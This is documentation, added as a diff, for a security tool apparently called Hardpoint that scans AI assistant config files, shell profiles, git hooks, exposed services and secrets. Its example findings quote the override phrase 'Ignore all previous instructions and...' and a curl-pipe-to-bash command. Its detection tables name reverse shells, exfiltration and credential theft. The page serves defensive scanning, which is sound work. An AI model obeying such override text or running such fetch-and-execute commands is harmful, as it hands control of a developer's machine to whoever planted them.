@@ -1,0 +1,166 @@
+---
+title: Scanners
+description: Understanding Hardpoint's security scanners
+---
+
+# Scanners
+
+Hardpoint includes five specialized scanners, each targeting a specific attack surface in developer environments.
+
+## AI Configuration Scanner
+
+Detects threats in AI coding assistant configuration files.
+
+### Files Scanned
+
+- `.cursorrules`, `.cursor/rules/*.mdc`
+- `mcp.json`, `.mcp.json`
+- `CLAUDE.md`, `AGENTS.md`
+- `.github/copilot-instructions.md`
+
+### Detections
+
+| ID | Name | Severity |
+| -- | ---- | -------- |
+| AI-001 | Instruction Override | Critical |
+| AI-002 | Hidden Unicode | High |
+| AI-003 | Role Confusion | High |
+| AI-004 | Data Exfiltration | Critical |
+| AI-005 | MCP Server Injection | Critical |
+
+### Example Finding
+
+```
+CRITICAL  AI-001: Instruction Override Detected
+          File: .cursorrules:15
+          "Ignore all previous instructions and..."
+```
+
+---
+
+## Shell Configuration Scanner
+
+Finds backdoors and malicious patterns in shell configs.
+
+### Files Scanned
+
+- `.bashrc`, `.bash_profile`, `.bash_aliases`
+- `.zshrc`, `.zprofile`, `.zsh_aliases`
+- `.profile`
+
+### Detections
+
+| ID | Name | Severity |
+| -- | ---- | -------- |
+| SHELL-001 | Reverse Shell | Critical |
+| SHELL-002 | Curl Pipe to Shell | High |
+| SHELL-003 | Encoded Command | High |
+| SHELL-004 | PATH Poisoning | Medium |
+| SHELL-005 | Alias Hijacking | Medium |
+
+### Example Finding
+
+```
+HIGH      SHELL-002: Curl Pipe to Shell
+          File: .bashrc:42
+          curl https://example.com/script | bash
+```
+
+---
+
+## Git Security Scanner
+
+Checks git hooks and configuration integrity.
+
+### Files Scanned
+
+- `.git/hooks/*`
+- `.git/config`
+- `.gitconfig`
+
+### Detections
+
+| ID | Name | Severity |
+| -- | ---- | -------- |
+| GIT-001 | Malicious Hook | Critical |
+| GIT-002 | Hook Exfiltration | High |
+| GIT-003 | Credential Theft | Critical |
+
+### Example Finding
+
+```
+CRITICAL  GIT-001: Malicious Git Hook
+          File: .git/hooks/pre-commit
+          Hook executes suspicious command
+```
+
+---
+
+## Network Exposure Scanner
+
+Identifies services exposed beyond localhost.
+
+### Services Checked
+
+- AI services: Ollama (11434), LM Studio (1234)
+- Databases: PostgreSQL (5432), MongoDB (27017), Redis (6379)
+- Development: Vite (5173), webpack-dev-server (8080)
+
+### Detections
+
+| ID | Name | Severity |
+| -- | ---- | -------- |
+| NET-001 | Service Exposed | High |
+| NET-002 | Database Exposed | Critical |
+
+### Example Finding
+
+```
+CRITICAL  NET-002: Database Exposed to Network
+          Service: PostgreSQL on 0.0.0.0:5432
+          Should bind to 127.0.0.1 instead
+```
+
+---
+
+## Secrets Scanner
+
+Finds hardcoded credentials using patterns and entropy analysis.
+
+### Files Scanned
+
+- `.env`, `.env.*`
+- Shell configurations
+- AWS credentials (`~/.aws/credentials`)
+- Configuration files
+
+### Detections
+
+| ID | Name | Severity |
+| -- | ---- | -------- |
+| SECRET-001 | AWS Access Key | Critical |
+| SECRET-002 | GitHub Token | High |
+| SECRET-003 | Private Key | Critical |
+| SECRET-004 | API Key | High |
+| SECRET-ENTROPY | High-Entropy String | Medium |
+
+### Example Finding
+
+```
+CRITICAL  SECRET-001: AWS Access Key Detected
+          File: .env:5
+          AKIAIOSFODNN7EXAMPLE
+```
+
+## Running Specific Scanners
+
+```bash
+# Run single scanner
+hardpoint scan ai
+
+# Run multiple scanners
+hardpoint scan ai shell secrets
+
+# Run all scanners (default)
+hardpoint scan
+```
